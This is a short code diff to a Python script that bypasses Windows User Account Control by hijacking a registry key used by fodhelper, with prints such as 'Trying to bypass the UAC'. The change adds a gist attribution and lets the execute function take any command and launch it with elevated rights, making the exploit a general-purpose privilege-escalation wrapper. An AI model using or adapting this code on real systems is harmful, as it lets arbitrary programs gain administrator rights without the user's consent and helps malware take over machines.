@@ -1,3 +1,5 @@
+# from https://gist.github.com/Preston-Landers/267391562bc96959eb41
+
 import os
 import sys
 import ctypes
@@ -36,12 +38,16 @@ def bypass_uac(cmd):
         create_reg_key(None, cmd)
     except WindowsError:
         raise
-def execute():
+def execute(run_cmd=None):
     if not is_running_as_admin():
         print('[!] The script is NOT running with administrative privileges')
         print('[+] Trying to bypass the UAC')
         try:
-            current_dir = os.path.dirname(os.path.realpath(__file__)) + '\\' + __file__
+            #current_dir = os.path.dirname(os.path.realpath(__file__)) + '\\' + __file__
+            if run_cmd:
+                current_dir = run_cmd
+            else:
+                current_dir = __file__
             cmd = '{} /k {} {}'.format(CMD, PYTHON_CMD, current_dir)
             bypass_uac(cmd)
             os.system(FOD_HELPER)
